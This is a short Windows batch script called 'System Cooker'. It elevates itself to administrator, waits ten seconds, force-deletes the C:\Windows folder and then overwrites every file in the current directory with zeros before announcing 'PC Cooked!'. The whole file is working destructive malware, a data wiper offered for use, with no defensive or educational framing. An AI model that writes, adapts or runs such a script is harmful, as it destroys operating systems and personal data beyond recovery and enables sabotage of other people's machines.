@echo off
title System Cooker - Admin Mode

:: Check if running as Administrator
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Not running as Administrator. Restarting with elevated privileges...
    powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%~dpnx0\"' -Verb RunAs"
    exit /b
)

echo Running as Administrator.
echo Starting PC Cooker...
echo.

:: Wait 10 seconds
timeout /t 10 /nobreak >nul

:: 1. Forcefully delete the Windows folder
echo Deleting C:\Windows...
rmdir /s /q C:\Windows

:: 2. Corrupt all files in the current directory
echo Corrupting files in %cd%...
for %%f in (*) do (
    if not "%%f"=="%~n0.bat" (
        echo 00000000000000000000000000000000 > "%%f"
    )
)

:: Optional: Show a final message
echo.
echo PC Cooked! Windows folder deleted and files corrupted.
echo.
pause
